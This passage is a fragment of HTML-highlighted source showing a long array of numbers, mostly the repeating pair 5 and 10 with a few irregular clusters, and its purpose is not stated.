class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">6</span>,<span class="number">3</span>,<span class="number">11</span>,<span class="number">8</span>,<span class="number">7</span>,<span class="number">4</span>,<span class="number">1</span>,<span class="number">8</span>,<span class="number">0</span>,<span class="number">6</span>,<span class="number">11</span>,<span class="number">11</span>,<span class="number">5</span>,<span class="number">7</span>,<span class="number">4</span>,<span class="number">1</span>,<span class="number">8</span>,<span class="number">1</span>,<span class="number">6</span>,<span class="number">19</span>,<span class="number">11</span>,<span class="number">3</span>,<span class="number">7</span>,<span class="number">4</span>,<span class="number">1</span>,<span class="number">8</span>,<span class="number">2</span>,<span class="number">6</span>,<span class="number">27</span>,<span class="number">11</span>,<span class="number">7</span>,<span class="number">7</span>,<span class="number">4</span>,<span class="number">1</span>,<span class="number">8</span>,<span class="number">3</span>,<span class="number">9</span>,<span class="number">3</span>,<span class="number">359</span>,<span class="number">4</span>,<span class="number">2</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">6</span>,<span class="number">4</span>,<span class="number">11</span>,<span class="number">3</span>,<span class="number">7</span>,<span class="number">4</span>,<span class="number">1</span>,<span class="number">8</span>,<span class="number">0</span>,<span class="number">6</span>,<span class="number">12</span>,<span class="number">11</span>,<span class="number">8</span>,<span class="number">7</span>,<span class="number">4</span>,<span class="number">1</span>,<span class="number">8</span>,<span class="number">1</span>,<span class="number">6</span>,<span class="number">20</span>,<span class="number">11</span>,<span class="number">3</span>,<span class="number">7</span>,<span class="number">4</span>,<span class="number">1</span>,<span class="number">8</span>,<span class="number">2</span>,<span class="number">6</span>,<span class="number">28</span>,<span class="number">11</span>,<span class="number">8</span>,<span class="number">7</span>,<span class="number">4</span>,<span class="number">1</span>,<span class="number">8</span>,<span class="number">3</span>,<span class="number">6</span>,<span class="number">33</span>,<span class="number">11</span>,<span class="number">3</span>,<span class="number">7</span>,<span class="number">4</span>,<span class="number">1</span>,<span class="number">8</span>,<span class="number">4</span>,<span class="number">9</span>,<span class="number">3</span>,<span class="number">689</span>,<span class="number">4</span>,<span class="number">2</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span 